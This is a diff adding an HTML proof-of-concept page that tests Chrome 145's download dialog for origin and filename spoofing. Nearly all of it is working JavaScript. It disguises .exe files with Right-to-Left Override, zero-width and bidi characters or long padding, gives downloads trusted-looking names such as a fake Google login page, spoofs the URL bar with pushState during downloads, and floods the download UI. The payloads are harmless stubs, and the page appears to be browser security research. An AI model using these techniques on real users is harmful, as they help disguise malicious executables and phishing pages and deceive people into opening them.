@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: Download Dialog Origin Spoofing — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+  h1 { color: #ff6b6b; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
+  pre { white-space: pre-wrap; word-break: break-all; color: #7bed9f; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 4px; border-radius: 3px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; }
+</style>
+</head>
+<body>
+<h1>PoC: Download Dialog & Content-Disposition Spoofing</h1>
+<p class="warn">Target: Chrome 145 | Tests download UI for origin confusion and filename spoofing</p>
+<p class="warn">Related: CVE-2023-2929, CVE-2021-30625 (download UI spoofing)</p>
+
+<h2>Test 1: Blob download with misleading filename</h2>
+<div class="test-case">
+  <p>Creates a blob download with a filename that looks like it's from a trusted source.</p>
+  <button onclick="test1()">Download (safe .txt)</button>
+  <button onclick="test1b()">Download (dangerous .html)</button>
+  <pre id="t1"></pre>
+</div>
+
+<h2>Test 2: Download with RLO in filename</h2>
+<div class="test-case">
+  <p>Uses Right-to-Left Override to make filename extension appear different (e.g., exe→txt).</p>
+  <button onclick="test2()">Download with RLO filename</button>
+  <pre id="t2"></pre>
+</div>
+
+<h2>Test 3: Download triggered during navigation</h2>
+<div class="test-case">
+  <p>Triggers download while page is navigating, testing if download dialog shows correct origin.</p>
+  <button onclick="test3()">Run Test</button>
+  <pre id="t3"></pre>
+</div>
+
+<h2>Test 4: Multiple simultaneous downloads</h2>
+<div class="test-case">
+  <p>Triggers many downloads at once to overwhelm the download UI and potentially confuse origin display.</p>
+  <button onclick="test4(5)">5 downloads</button>
+  <button onclick="test4(20)">20 downloads</button>
+  <pre id="t4"></pre>
+</div>
+
+<h2>Test 5: Data URL download with Content-Disposition simulation</h2>
+<div class="test-case">
+  <p>Tests data: URL downloads and how Chrome handles the filename/origin display.</p>
+  <button onclick="test5()">Download data URL</button>
+  <pre id="t5"></pre>
+</div>
+
+<h2>Test 6: Download via iframe sandbox</h2>
+<div class="test-case">
+  <p>Triggers download from a sandboxed iframe. Tests if origin in download dialog matches iframe or parent.</p>
+  <button onclick="test6()">Run Test</button>
+  <pre id="t6"></pre>
+  <iframe id="t6frame" sandbox="allow-downloads allow-scripts" style="width:100%;height:60px;border:1px solid #555;display:none;"></iframe>
+</div>
+
+<h2>Test 7: Download with very long filename</h2>
+<div class="test-case">
+  <p>Tests if extremely long filenames can push the real extension off-screen in download bar.</p>
+  <button onclick="test7()">Download long filename</button>
+  <pre id="t7"></pre>
+</div>
+
+<h2>Test 8: Navigation + download + history race</h2>
+<div class="test-case">
+  <p>Combines pushState URL change with download trigger to confuse which origin initiated the download.</p>
+  <button onclick="test8()">Run Test</button>
+  <pre id="t8"></pre>
+</div>
+
+<script>
+function log(id, msg) {
+  document.getElementById(id).textContent += msg + '\n';
+}
+
+function triggerDownload(blob, filename) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
+  return url;
+}
+
+// Test 1: Misleading filename
+function test1() {
+  const content = 'This is a safe text file.\nDownloaded from: ' + location.origin;
+  const blob = new Blob([content], { type: 'text/plain' });
+  const url = triggerDownload(blob, 'google-security-update.txt');
+  log('t1', `Download triggered: google-security-update.txt`);
+  log('t1', `Blob URL: ${url}`);
+  log('t1', 'Check download bar: does it show the real origin or could it be confused?');
+}
+
+function test1b() {
+  const html = `<!DOCTYPE html><html><body>
+<h1>Fake Google Login</h1>
+<form><input placeholder="Email"><br><input type="password" placeholder="Password"><br>
+<button>Sign In</button></form></body></html>`;
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = triggerDownload(blob, 'Google_Account_Verification.html');
+  log('t1', `Download triggered: Google_Account_Verification.html`);
+  log('t1', 'Check: Does Chrome warn about HTML file download? Is origin displayed?');
+}
+
+// Test 2: RLO filename
+function test2() {
+  const RLO = '\u202E';
+  const PDF = '\u202C';
+
+  // "document_txt.exe" but with RLO to make it look like "document_exe.txt"
+  const spoofedName = `document_${RLO}txt.exe${PDF}`;
+  const content = 'This file has a spoofed extension via RLO character.';
+  const blob = new Blob([content], { type: 'application/octet-stream' });
+
+  log('t2', `Filename with RLO: document_[U+202E]txt.exe[U+202C]`);
+  log('t2', `Should display as: document_exe.txt (hiding the .exe extension)`);
+
+  const url = triggerDownload(blob, spoofedName);
+  log('t2', `Download triggered. Check filename in download bar.`);
+
+  // Also try other Bidi chars in filename
+  const names = [
+    `report${RLO}fdp.exe`,           // looks like report.exe.pdf → reportexe.pdf
+    `image\u2066.exe\u2069.png`,      // LRI hides .exe
+    `safe${'\u200B'}.exe`,            // zero-width space before .exe
+    `safe\u00AD.exe`,                  // soft hyphen
+  ];
+
+  for (const name of names) {
+    const b = new Blob(['test'], { type: 'application/octet-stream' });
+    triggerDownload(b, name);
+    log('t2', `Also downloading: "${name}" (check rendering)`);
+  }
+}
+
+// Test 3: Download during navigation
+function test3() {
+  log('t3', 'Pushing fake state then triggering download...');
+  const origUrl = location.href;
+
+  // Change URL bar appearance
+  history.pushState({}, '', '/downloads/chrome-update-145.0.exe');
+  log('t3', `URL bar now shows: ${location.href}`);
+
+  // Trigger download — does download dialog reference current URL bar content?
+  setTimeout(() => {
+    const blob = new Blob(['fake update'], { type: 'application/octet-stream' });
+    triggerDownload(blob, 'ChromeUpdate.exe');
+    log('t3', 'Download triggered while URL bar shows /downloads/chrome-update...');
+    log('t3', 'Check: Does download dialog show the spoofed path or real origin?');
+  }, 100);
+
+  setTimeout(() => {
+    history.replaceState({}, '', origUrl);
+    log('t3', `URL restored: ${location.href}`);
+  }, 2000);
+}
+
+// Test 4: Download flood
+function test4(count) {
+  log('t4', `Triggering ${count} simultaneous downloads...`);
+  for (let i = 0; i < count; i++) {
+    const blob = new Blob([`File ${i} content`], { type: 'application/octet-stream' });
+    triggerDownload(blob, `important_file_${i}.dat`);
+  }
+  log('t4', `${count} downloads triggered. Check: Is Chrome's download UI overwhelmed?`);
+  log('t4', 'Can origin info be obscured when many downloads queue up?');
+}
+
+// Test 5: Data URL download
+function test5() {
+  // Direct data URL download via anchor
+  const a = document.createElement('a');
+  a.href = 'data:application/octet-stream;base64,SGVsbG8gV29ybGQ=';
+  a.download = 'from-google-drive.pdf';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  log('t5', 'Data URL download triggered with filename "from-google-drive.pdf"');
+  log('t5', 'Check: What origin does Chrome show for data: URL downloads?');
+
+  // Also test with MIME type mismatch
+  setTimeout(() => {
+    const a2 = document.createElement('a');
+    a2.href = 'data:text/html;base64,' + btoa('<script>alert("xss")<\/script>');
+    a2.download = 'readme.txt';
+    document.body.appendChild(a2);
+    a2.click();
+    document.body.removeChild(a2);
+    log('t5', 'Downloaded HTML content with .txt extension. MIME mismatch test.');
+  }, 500);
+}
+
+// Test 6: Sandboxed iframe download
+function test6() {
+  const frame = document.getElementById('t6frame');
+  frame.style.display = 'block';
+
+  const html = `<!DOCTYPE html><html><body style="margin:0;padding:5px;font-family:monospace;font-size:11px;">
+<script>
+  const blob = new Blob(['iframe download content'], {type:'application/octet-stream'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'from-iframe.dat';
+  a.textContent = 'Download from sandboxed iframe';
+  document.body.appendChild(a);
+  // Auto-trigger
+  a.click();
+  document.write('<br>Download triggered from sandboxed iframe. Origin: ' + location.origin);
+<\/script>
+</body></html>`;
+
+  frame.srcdoc = html;
+  log('t6', 'Sandboxed iframe created with allow-downloads allow-scripts.');
+  log('t6', 'Check: What origin does Chrome display for iframe-initiated download?');
+}
+
+// Test 7: Very long filename
+function test7() {
+  // Craft filename where the real .exe extension is pushed far right
+  const padding = 'safe_document_from_google_drive_shared_with_you_important_';
+  const longName = padding.repeat(5) + '.exe';
+  const blob = new Blob(['payload'], { type: 'application/octet-stream' });
+  triggerDownload(blob, longName);
+  log('t7', `Filename length: ${longName.length} chars`);
+  log('t7', `Name: ${longName.substring(0, 80)}...exe`);
+  log('t7', 'Check: Is .exe extension visible in download bar or truncated?');
+
+  // Also test with double extension
+  setTimeout(() => {
+    const doubleName = 'quarterly_report.pdf' + ' '.repeat(100) + '.exe';
+    const b = new Blob(['payload2'], { type: 'application/octet-stream' });
+    triggerDownload(b, doubleName);
+    log('t7', `Double ext: quarterly_report.pdf[100 spaces].exe`);
+    log('t7', 'Check: Does user see .pdf or .exe?');
+  }, 300);
+}
+
+// Test 8: Combined race
+function test8() {
+  const origUrl = location.href;
+  log('t8', 'Starting combined navigation + download + history race...');
+
+  // Phase 1: Change URL bar
+  history.pushState({}, '', '/google.com/secure-download');
+  log('t8', `Phase 1: URL bar → ${location.href}`);
+
+  // Phase 2: Trigger download from apparent google.com path
+  setTimeout(() => {
+    const blob = new Blob(['<html><body>phishing</body></html>'], { type: 'text/html' });
+    triggerDownload(blob, 'Google_2FA_Setup.html');
+    log('t8', 'Phase 2: Download triggered from spoofed path');
+  }, 50);
+
+  // Phase 3: Rapidly change URL to confuse download origin attribution
+  setTimeout(() => {
+    for (let i = 0; i < 10; i++) {
+      history.pushState({}, '', `/page-${i}`);
+    }
+    log('t8', 'Phase 3: Rapid history pushes during download');
+  }, 100);
+
+  // Phase 4: Navigate away
+  setTimeout(() => {
+    history.replaceState({}, '', origUrl);
+    log('t8', `Phase 4: Restored URL. Check download dialog origin throughout.`);
+  }, 500);
+}
+</script>
+</body>
+</html>
